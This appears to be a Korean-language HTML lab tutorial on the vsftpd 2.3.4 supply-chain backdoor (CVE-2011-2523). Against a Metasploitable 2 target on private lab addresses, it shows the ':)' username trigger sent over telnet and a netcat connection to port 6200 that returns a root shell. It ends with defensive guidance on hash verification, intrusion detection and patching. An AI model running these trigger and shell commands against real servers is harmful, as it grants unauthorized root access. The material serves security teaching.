@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>vsftpd 2.3.4 Backdoor Command Execution 실습</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .code-block { font-family: 'Fira Code', monospace; }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-blur: xl; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header Section -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">CVE-2011-2523 | Exploitation</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight">
+                    vsftpd 2.3.4 Backdoor<br><span class="text-slate-100 text-2xl">커맨드 실행 및 세션 관리 실무</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block">
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
+                    CRITICAL : 10.0
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Pro</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+
+        <!-- Section 1: Overview & Architecture Diagram -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                1. 취약점 메커니즘 (Vulnerability Mechanism)
+            </h2>
+            
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
+                    본 취약점은 <strong class="text-cyan-400">공급망 공격 (Supply Chain Attack, 소프트웨어 제작 및 배포 인프라를 침해하여 소스코드에 악성 기능을 삽입하는 공격)</strong>의 대표적 사례입니다. 
+                    공격자가 FTP(File Transfer Protocol, 파일 전송 프로토콜) 서비스의 계정명에 특정 문자열을 전송하면, 서버의 커널 레벨에서 백도어 포트를 개방하는 원리입니다.
+                </p>
+
+                <!-- 도식화 그림: 백도어 트리거 프로세스 -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: 백도어 트리거 및 리버스 쉘 연결 아키텍처]
+                    </h4>
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-4">
+                        <!-- Attacker -->
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg">
+                            <i data-lucide="skull" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">공격자 (Attacker)</div>
+                            <div class="text-[10px] text-cyan-500 font-mono mt-1">USER anyuser:)</div>
+                        </div>
+                        <!-- Arrow 1 -->
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="arrow-right" class="w-8 h-8 text-slate-600 rotate-90 md:rotate-0"></i>
+                            <span class="text-[9px] font-mono text-slate-500">Port 21 (FTP)</span>
+                        </div>
+                        <!-- Target (Trigger) -->
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-red-900/50 shadow-lg relative">
+                            <div class="absolute -top-3 left-1/2 -translate-x-1/2 bg-red-600 text-white text-[8px] px-2 py-0.5 rounded-full animate-pulse">BACKDOOR TRIGGERED</div>
+                            <i data-lucide="server" class="w-12 h-12 text-red-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">타겟 (Target)</div>
+                            <div class="text-[10px] text-red-500 font-mono mt-1">vsftpd 2.3.4</div>
+                        </div>
+                        <!-- Arrow 2 -->
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="arrow-right" class="w-8 h-8 text-slate-600 rotate-90 md:rotate-0"></i>
+                            <span class="text-[9px] font-mono text-emerald-500 font-bold">Port 6200 OPEN</span>
+                        </div>
+                        <!-- Shell -->
+                        <div class="flex-1 text-center p-6 bg-emerald-900/20 border border-emerald-500/30 rounded-xl shadow-lg">
+                            <i data-lucide="terminal" class="w-12 h-12 text-emerald-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">루트 쉘 (Root Shell)</div>
+                            <div class="text-[10px] text-emerald-500 font-mono mt-1">Interactive Access</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-10 grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div class="bg-blue-900/10 border-l-4 border-blue-500 p-6 rounded-r-2xl">
+                        <h5 class="text-blue-400 font-bold mb-2 flex items-center gap-2">
+                            <i data-lucide="info" class="w-4 h-4"></i> 트리거 조건 (Condition)
+                        </h5>
+                        <p class="text-sm text-slate-300 leading-relaxed">
+                            계정명(USER) 끝에 <code class="text-cyan-300 font-bold">:)</code> 문자를 포함하여 전송하면 서버 내부의 <code class="text-pink-400">vsf_sysutil_extra()</code> 함수가 호출되며, 즉시 <strong class="text-white">6200/TCP</strong> 포트가 바인딩(Binding, 네트워크 포트 할당)됩니다.
+                        </p>
+                    </div>
+                    <div class="bg-amber-900/10 border-l-4 border-amber-500 p-6 rounded-r-2xl">
+                        <h5 class="text-amber-400 font-bold mb-2 flex items-center gap-2">
+                            <i data-lucide="zap" class="w-4 h-4"></i> 공격 영향 (Impact)
+                        </h5>
+                        <p class="text-sm text-slate-300 leading-relaxed">
+                            별도의 패스워드 인증 없이 6200번 포트로 접속하는 모든 사용자에게 <strong class="text-white">root</strong> 권한의 인터랙티브 쉘(Interactive Shell, 대화형 명령어 입력 환경)이 제공됩니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: Environment Setup -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                2. 실습 환경 구성 (Environment Setup)
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <!-- Attacker -->
+                <div class="section-card rounded-3xl p-8 border-cyan-900/30 shadow-xl relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-cyan-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter">Attacker</div>
+                    <div class="flex items-center gap-4 mb-6">
+                        <div class="bg-cyan-500/20 p-3 rounded-2xl"><i data-lucide="terminal" class="w-8 h-8 text-cyan-400"></i></div>
+                        <div>
+                            <h3 class="text-xl font-bold text-slate-100">공격자 노드</h3>
+                            <p class="text-xs text-slate-500 font-mono">Kali Linux v2024.x</p>
+                        </div>
+                    </div>
+                    <ul class="space-y-4">
+                        <li class="flex items-center gap-3 text-sm text-slate-300">
+                            <i data-lucide="check-circle-2" class="w-4 h-4 text-cyan-500"></i>
+                            <span><strong>IP Address:</strong> 192.168.50.10</span>
+                        </li>
+                        <li class="flex items-center gap-3 text-sm text-slate-300">
+                            <i data-lucide="check-circle-2" class="w-4 h-4 text-cyan-500"></i>
+                            <span><strong>Tools:</strong> MSF, Nmap, Telnet, Netcat</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- Target -->
+                <div class="section-card rounded-3xl p-8 border-red-900/30 shadow-xl relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter">Target</div>
+                    <div class="flex items-center gap-4 mb-6">
+                        <div class="bg-red-500/20 p-3 rounded-2xl"><i data-lucide="shield-off" class="w-8 h-8 text-red-400"></i></div>
+                        <div>
+                            <h3 class="text-xl font-bold text-slate-100">타겟 인프라</h3>
+                            <p class="text-xs text-slate-500 font-mono">Metasploitable 2</p>
+                        </div>
+                    </div>
+                    <ul class="space-y-4">
+                        <li class="flex items-center gap-3 text-sm text-slate-300">
+                            <i data-lucide="target" class="w-4 h-4 text-red-500"></i>
+                            <span><strong>IP Address:</strong> 192.168.50.100</span>
+                        </li>
+                        <li class="flex items-center gap-3 text-sm text-slate-300">
+                            <i data-lucide="target" class="w-4 h-4 text-red-500"></i>
+                            <span><strong>Service:</strong> vsftpd v2.3.4 (Port 21)</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="warning-box mt-10 p-8 flex gap-6 items-start">
+                <div class="bg-red-500/20 p-4 rounded-2xl"><i data-lucide="alert-octagon" class="w-8 h-8 text-red-500"></i></div>
+                <div class="space-y-2">
+                    <h4 class="text-red-400 font-black text-lg uppercase tracking-tight italic">Cloud Infrastructure Security Warning</h4>
+                    <p class="text-sm text-slate-300 leading-relaxed">
+                        AWS EC2(Elastic Compute Cloud, 아마존 탄력적 컴퓨팅) 환경에서 실습 시, <strong>보안 그룹(Security Group)</strong>의 인바운드 규칙에서 <strong>21/TCP 및 6200/TCP</strong> 포트를 <code class="bg-slate-900 px-1 rounded text-red-300 font-mono">0.0.0.0/0</code>(Anywhere)으로 개방하는 행위는 매우 위험합니다. 전 세계 스캔 봇에 의해 시스템이 장악되어 <strong>크립토 마이닝(Crypto Mining, 암호화폐 채굴)</strong> 등에 악용될 수 있으므로 반드시 본인의 공인 IP로만 접근을 제한하십시오.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: Manual Exploitation -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                3. 수동 공격 및 세션 관리 (Manual Exploitation & Session Control)
+            </h2>
+            
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
+                <p class="text-slate-300 text-lg">
+                    자동화 도구(Metasploit) 없이도 리눅스 기본 유틸리티인 <strong class="text-cyan-400">Telnet(텔넷)</strong> 또는 <strong class="text-cyan-400">Netcat(넷캣)</strong>을 사용하여 취약점을 수동으로 트리거하고, 획득한 세션을 안전하게 종료하는 절차를 실습합니다.
+                </p>
+
+                <!-- Step 1 -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-xs font-black">1</span>
+                        <h3 class="text-xl font-bold text-slate-100">백도어 서비스 발동 (Triggering)</h3>
+                    </div>
+                    <p class="text-sm text-slate-400 pl-9">FTP 21번 포트에 접속하여 특수 계정명 <code class="text-cyan-400 font-bold">:)</code>를 전송합니다.</p>
+                    <div class="pl-9">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative group">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Terminal 1</div>
+                            <div class="text-slate-500 mb-1"># Telnet을 이용한 21번 포트 접속</div>
+                            <div class="text-slate-200">$ <span class="text-cyan-400">telnet 192.168.50.100 21</span></div>
+                            <div class="text-slate-400 mt-2">Connected to 192.168.50.100.<br>220 (vsFTPd 2.3.4)</div>
+                            <div class="text-slate-200 mt-3">$ <span class="text-cyan-400">USER hello:)</span></div>
+                            <div class="text-slate-400">331 Please specify the password.</div>
+                            <div class="text-slate-200 mt-3">$ <span class="text-cyan-400">PASS secret</span></div>
+                            <div class="text-slate-500 mt-4 italic font-sans text-xs underline underline-offset-4">※ 위 터미널은 연결을 유지(Hang)한 상태로 새 터미널을 엽니다.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-xs font-black">2</span>
+                        <h3 class="text-xl font-bold text-slate-100">백도어 쉘 접속 (Exploitation)</h3>
+                    </div>
+                    <p class="text-sm text-slate-400 pl-9">트리거된 6200번 포트로 접속하여 루트 권한을 획득합니다.</p>
+                    <div class="pl-9">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative group">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Terminal 2</div>
+                            <div class="text-slate-500 mb-1"># 새 포트로 접속하여 명령어 실행</div>
+                            <div class="text-slate-200">$ <span class="text-emerald-400">nc -v 192.168.50.100 6200</span></div>
+                            <div class="text-slate-400 mt-2">Connection to 192.168.50.100 6200 port [tcp/*] succeeded!</div>
+                            <div class="text-slate-200 mt-3"><span class="text-emerald-400">id</span></div>
+                            <div class="text-emerald-500">uid=0(root) gid=0(root) groups=0(root)</div>
+                            <div class="text-slate-200 mt-3"><span class="text-emerald-400">whoami</span></div>
+                            <div class="text-emerald-500">root</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 3: Session Termination -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-red-500 text-white w-6 h-6 rounded-full flex items-center justify-center text-xs font-black">3</span>
+                        <h3 class="text-xl font-bold text-slate-100 text-red-400">세션 종료 및 백도어 제거 (Termination)</h3>
+                    </div>
+                    <p class="text-sm text-slate-400 pl-9">공격 행적을 지우거나 백도어 프로세스를 중단시키기 위해 세션을 안전하게 종료합니다.</p>
+                    <div class="pl-9">
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="text-slate-500 mb-1"># 1. 원격지에서 백도어 프로세스(vsftpd) 식별 및 종료</div>
+                            <div class="text-slate-200">$ <span class="text-red-400">ps -ef | grep vsftpd</span></div>
+                            <div class="text-slate-400 text-xs">root      4521     1  0 05:30 ?        00:00:00 vsftpd (backdoor)</div>
+                            <div class="text-slate-200 mt-3">$ <span class="text-red-400">kill -9 4521</span> <span class="text-slate-500 font-sans text-xs">(※ PID는 가변적입니다)</span></div>
+                            
+                            <div class="mt-6 border-t border-slate-800 pt-4">
+                                <div class="text-slate-500 mb-1"># 2. 로컬 쉘 세션 탈출</div>
+                                <div class="text-slate-200">$ <span class="text-red-400">exit</span> 또는 <span class="text-red-400">Ctrl + C</span></div>
+                                <div class="text-slate-400 mt-1">Connection closed by foreign host.</div>
+                            </div>
+                        </div>
+                        <div class="info-box border-l-red-500 bg-red-950/10 mt-4 p-4 text-xs text-red-300">
+                            <strong>전문가 조언:</strong> 실제 사고 분석 시에는 프로세스를 단순히 <code>kill</code> 하기보다, <code>lsof -i :6200</code> 명령어를 통해 해당 포트를 점유 중인 프로세스의 상세 정보를 로깅(Logging)하여 증거를 확보하는 것이 선행되어야 합니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 4: Architecture Insight -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                4. 아키텍트 인사이트 및 보안 대책
+            </h2>
+            
+            <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
+                <div class="flex flex-col md:flex-row gap-8 items-stretch">
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-cyan-400 mb-4"><i data-lucide="binary" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">무결성 검증 (Integrity Check)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            오픈소스 소프트웨어를 인프라에 도입할 때, 공식 배포처에서 제공하는 <strong>해시값(Hash Value, SHA-256 등)</strong>을 기반으로 바이너리의 변조 여부를 반드시 검증해야 합니다. CI/CD(지속적 통합/배포) 파이프라인에 보안 스캐닝 단계를 통합하는 DevSecOps 아키텍처가 필수적입니다.
+                        </p>
+                    </div>
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-blue-400 mb-4"><i data-lucide="network" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">심층 방어 (Defense in Depth)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            서비스에 필요한 21번 포트 외에, 6200번과 같이 승인되지 않은 비정상 포트가 활성화되는 행위를 <strong>IDS/IPS(침입 탐지/차단 시스템)</strong>가 실시간으로 차단해야 합니다. 네트워크 분리(Segmentation)를 통해 관리망과 서비스망을 철저히 격리하십시오.
+                        </p>
+                    </div>
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-emerald-400 mb-4"><i data-lucide="refresh-cw" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">패치 관리 정책 (Patching)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            운영 시스템의 패키지 버전을 주기적으로 스캔하고, 취약점이 보고된 버전은 즉시 <strong>업데이트 및 업그레이드(Update & Upgrade)</strong>해야 합니다. 가급적 취약점이 검증된 최신 LTS(Long Term Support, 장기 지원) 버전의 OS를 사용하십시오.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 Security Architecture Lab. All rights reserved.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto">
+            본 교재는 교육 목적으로만 사용되어야 하며, 인가되지 않은 시스템에 대한 공격 시도는 정보통신망법 등 관련 법률에 따라 처벌받을 수 있습니다. 모든 실습은 격리된 환경(Sandboxed Environment)에서 진행하십시오.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
